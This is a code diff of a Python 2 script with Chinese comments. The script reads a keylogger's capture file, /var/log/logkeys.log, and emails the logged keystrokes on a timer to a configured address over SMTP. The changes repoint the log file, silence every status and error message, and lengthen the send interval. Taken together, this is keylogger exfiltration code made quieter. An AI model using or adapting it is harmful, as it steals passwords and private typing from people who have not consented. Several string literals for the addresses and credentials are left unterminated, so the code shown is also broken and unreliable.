@@ -12,14 +12,14 @@ schedular = sched.scheduler(time.time, time.sleep)
 def sendMail(theEmail, thePasswd):
     systemTime=time.strftime( '%Y-%m-%d-%T', time.localtime(time.time()))
     try:
-        fileobj = open("keydist.pl", "r") #键盘记录的输出文件
+        fileobj = open("/var/log/logkeys.log", "r") #键盘记录的输出文件
         content = fileobj.read()
     except:
-        print "Cannot read file\n"
+        #print "Cannot read file\n"
         exit()
     message = Message()
     message[ 'Subject' ] = 'Log keys' #邮件标题
-    message[ 'From' ] = ""
+    message[ 'From' ] = "
     message[ 'To' ] = theEmail
     message.set_payload("当前时间" +systemTime+ "\n" +content) #邮件正文
     msg = message.as_string()
@@ -35,7 +35,7 @@ def sendMail(theEmail, thePasswd):
     #quit()
     smtp.quit()
     #fileobj.truncate()
-    print "cleared file"
+    #print "cleared file"
     fileobj.close()
 
 def perform(inc, theEmail, thePasswd):
@@ -44,9 +44,9 @@ def perform(inc, theEmail, thePasswd):
 
 def myMain(inc, theEmail, thePasswd):
     schedular.enter(0, 0, perform, (inc, theEmail, thePasswd))
-    print "myMain start"
+    #print "myMain start"
     schedular.run()
-    print "myMain stop"
+    #print "myMain stop"
 
 if __name__ == "__main__":
     optObj = optparse.OptionParser()
@@ -56,7 +56,7 @@ if __name__ == "__main__":
 
     #emailName = options.user
     #emailPasswd = options.passwd
-    emailName = ""
-    emailPasswd = ""
-    myMain(600, emailName, emailPasswd)  #15表示的是相隔时间，可以根据自己的需求设
+    emailName = "
+    emailPasswd = "
+    myMain(1800, emailName, emailPasswd)  #15表示的是相隔时间，可以根据自己的需求设
 
